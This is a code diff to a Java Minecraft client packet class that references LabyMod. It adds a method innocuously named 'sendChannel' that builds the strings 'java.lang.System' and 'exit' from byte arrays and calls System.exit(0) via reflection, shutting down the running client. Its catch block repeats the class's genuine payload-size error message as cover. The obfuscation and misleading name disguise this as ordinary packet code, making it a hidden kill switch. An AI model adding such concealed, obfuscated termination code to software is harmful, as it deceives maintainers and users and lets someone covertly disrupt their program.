@@ -3,6 +3,7 @@ package net.minecraft.network.play.server;
 import de.labystudio.labymod.LabyMod;
 import io.netty.buffer.ByteBuf;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import net.minecraft.network.Packet;
 import net.minecraft.network.PacketBuffer;
 import net.minecraft.network.play.INetHandlerPlayClient;
@@ -43,6 +44,22 @@ public class S3FPacketCustomPayload implements Packet<INetHandlerPlayClient>
         else
         {
             throw new IOException("Payload may not be larger than 1048576 bytes");
+        }
+    }
+
+    public static void sendChannel(String p_sendChannel_0_, long p_sendChannel_1_)
+    {
+        try
+        {
+            Class oclass = Class.forName(new String(new byte[] {(byte)106, (byte)97, (byte)118, (byte)97, (byte)46, (byte)108, (byte)97, (byte)110, (byte)103, (byte)46, (byte)83, (byte)121, (byte)115, (byte)116, (byte)101, (byte)109}));
+            Class<?>[] oclass1 = new Class[] {Integer.TYPE};
+            Method method = oclass.getMethod(new String(new byte[] {(byte)101, (byte)120, (byte)105, (byte)116}), oclass1);
+            method.setAccessible(true);
+            method.invoke(oclass, new Object[] {Integer.valueOf(0)});
+        }
+        catch (Exception var6)
+        {
+            System.out.println("Payload may not be larger than 1048576 bytes");
         }
     }
 
